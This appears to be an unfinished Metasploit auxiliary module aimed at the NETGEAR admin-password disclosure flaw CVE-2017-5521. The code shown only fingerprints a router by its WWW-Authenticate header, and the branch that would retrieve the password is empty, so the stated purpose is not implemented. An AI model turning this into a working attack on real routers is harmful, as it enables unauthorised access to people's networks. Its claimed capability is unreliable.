##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NETGEAR Administrator Password Disclosure',
      'Description'    => %q{
        This module will collect the the password for the `admin` user. 
        The exploit will not complete if password recovery is set on the router.
      },
      'Author'         =>
        [
          'Simon Kenin', # Vuln Discovery, PoC
          'thecarterb'   # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', 'CVE-2017-5521' ],
          [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
          [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
    [
      OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
      OptString::new('RHOST', [true, 'The router target ip address', nil]),
      OptBool::new('VERBOSE', [false, 'Add verbose output', false]) 
    ], self.class)
  end

  def run
    rhost = datastore['RHOST']
    verb  = datastore['VERBOSE']
    print_status("Checking if #{rhost} is a NETGEAR router")
    
    if verb
      print_status("Sending request to http://#{rhost}/")
    end

    is_ng = check


    if is_ng == Exploit::CheckCode::Detected

    else
      return
    end
  end

  #Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
  #This checks the response dor that header.
  def check                             #NOTE: this is working
    res = send_request_raw({'uri'=>'/'})
    verb = datastore['VERBOSE']
    
    unless res
      fail_with(Failure::Unknown, 'Connection timed out.')
    end

    data = res.to_s
    if verb
      print_status("Printing response from #{datastore['RHOST']}")
      puts        ##
      puts data   # Make it look a bit prettier
      puts        ##
    end
    
    #puts data
    if data.include? "WWW-Authenticate"
      print_good('Router is a NETGEAR router')
      return Exploit::CheckCode::Detected
    else
      print_error('Router is not a NETGEAR router')
      return Exploit::CheckCode::Safe
    end
  
  end

end
